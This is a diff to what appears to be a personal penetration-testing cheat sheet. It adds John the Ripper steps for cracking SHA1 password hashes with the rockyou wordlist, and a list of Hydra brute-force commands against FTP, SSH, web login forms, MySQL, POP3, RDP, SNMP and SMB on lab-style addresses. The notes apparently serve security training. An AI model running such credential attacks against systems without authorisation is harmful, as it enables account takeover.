@@ -22,3 +22,27 @@ Hashcat -a 3 -m 900 hash.txt /rockyou.txt
 1400 SHA256
 3200 BCRYPT
 160 HMAC-SHA1
+
+John 
+1. First analyze hash type - `john hashfile.hash`
+2. Then crack hash - `john hashfile.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1`
+3. Show the cracked password - `john --show --format=Raw-SHA1 hashfile.hash` OR `john --show hashfile.hash
+
+
+Hydra
+
+- **FTP**: hydra -l user -P passlist.txt [ftp://10.10.46.122](ftp://10.10.46.122/)
+    
+            hydra -L userlist.txt -P passlist.txt [ftp://10.10.46.122](ftp://10.10.46.122/)
+    
+- SSH: hydra -l <username> -P <full path to pass> 10.10.46.122 -t 4 ssh
+- Post Web Form: hydra -l <username> -P <wordlist> 10.10.46.122 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+
+- `hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://[IP]`
+- `hydra -l root -P passwords.txt [-t 32] <IP> ftp
+- `hydra -L usernames.txt -P pass.txt <IP> mysql
+- `hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V`
+- `hydra -V -f -L <userslist> -P <passwlist> ***rdp***://<IP>`
+- `hydra -P common-snmp-community-strings.txt target.com snmp
+- `hydra -l Administrator -P words.txt 192.168.1.12 smb t 1
+- `hydra -l root -P passwords.txt <IP> ssh
